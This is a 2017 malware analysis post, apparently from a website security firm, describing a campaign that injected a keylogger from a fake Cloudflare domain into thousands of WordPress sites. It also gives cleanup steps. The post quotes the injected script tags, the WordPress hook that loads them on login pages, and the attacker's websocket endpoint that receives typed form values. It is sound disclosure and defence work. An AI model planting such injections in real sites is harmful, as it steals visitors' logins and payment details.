@@ -1,0 +1,33 @@
+Cloudflare[.]Solutions Keylogger on Thousands of Infected WordPress Sites
+
+Update Dec. 8 2017: The cloudflare[.]solutions domain has now been taken down.
+A few weeks ago, we wrote about a massive WordPress infection that injected an obfuscated script pretending to be jQuery and Google Analytics. In reality, this script loaded a CoinHive cryptocurrency miner from a third-party server.
+We also mentioned a post written back in April that described the cloudflare.solutions malware, which came along with the cryptominers. At this moment, PublcWWW reports there are 5,482 sites infected with this malware. It seems that this evolving campaign is now adding keyloggers to the mix.
+
+Injected Cloudflare[.]solutions Scripts
+The injected part of this malware didn’t change at all, using the theme’s function.php to enqueue the following scripts to WordPress pages:
+<script type='text/javascript' src='hxxp://cloudflare[.]solutions/ajax/libs/reconnecting-websocket/1.0.0/reconnecting-websocket.js'></script>
+
+<script type='text/javascript' src='hxxp://cloudflare[.]solutions/ajax/libs/cors/cors.js'></script>
+The script URLs are also the same, however, they use a fake CloudFlare domain. The first one (reconnecting-websocket.js) still loads a copy of a legitimate ReconnectingWebSocket library.
+What Changed Since April?
+The first change is the main page of this domain now says:
+“This server is part of an experimental science machine learning algorithms project”
+instead of
+“This Server is part of Cloudflare Distribution Network.”
+The second change is the cors.js script. Now when you decode it, there is no outright suspicious code like those banner images in the previous version. The only sketchy thing is that the script loads the Yandex.Metrika (Yandex’s alternative to Google Analytics). Most likely it is done to track the infected sites. By the way, the Yandex id of that script is 43930119 – it can also be found in the HTML code of the domain’s main page.
+Fake linter.js URLs Turn Into a Keylogger
+Then you might notice two cdnjs.cloudflare.com URLs with long hexadecimal parameters:
+Linter.js URLs in the decoded cors.js script
+This time the domain names really belong to CloudFlare and you might think it’s something legitimate. However, if you check the https://cdnjs.cloudflare.com/ajax/libs/linter/linter.js URL, you’ll notice that it doesn’t actually exist. When you check the code using those linterkey variables, you realize that the cdnjs.cloudflare.com is just a red herring and the real payloads are those hexadecimal numbers after the question mark in the URLs. The script decodes them and injects the following result into web pages:
+Keylogger code injected after URL decoding
+As you can see, it’s a keylogger. This script adds a handler to every input field on the websites to send its value to the attacker (wss://cloudflare[.]solutions:8085/) when a user leaves that field.
+What sort of data can be stolen this way? Since we are talking about WordPress sites, such sites usually have search boxes and comment forms. This might not be that interesting to the bad guys. But what if the WordPress site has some ecommerce functionality and embeds a checkout form? This scenario allows a hacker to steal the payment details.
+And of course, every WordPress site has a login form. Hackers don’t forget about that, so they add this code that injects the cloudflare[.]solutions keylogger to the login page as well.
+add_action('login_enqueue_scripts', 'add_js_scripts' );
+The below screenshot shows the websocket traffic on a login page of an infected site.
+WebSocket traffic (green) intercepted in Chrome Developer Tools
+As you can see, both the username and the password were sent to the cloudflare[.]solutions server even before a user clicks on the “Login” button.
+Mitigation
+As we already mentioned, the malicious code resides in the function.php file of the WordPress theme. You should remove the add_js_scripts function and all the add_action clauses that mention add_js_scripts. Given the keylogger functionality of this malware, you should consider all WordPress passwords compromised so the next mandatory step of the cleanup is changing the passwords (actually it is highly recommended after any site hack). Don’t forget to check your site for other infections too. Many sites with the cloudflare.solutions malware also have injected coinhive cryptocurrency miner scripts.
+For more detailed instructions on how to clean and protect your WordPress site check our online guide.
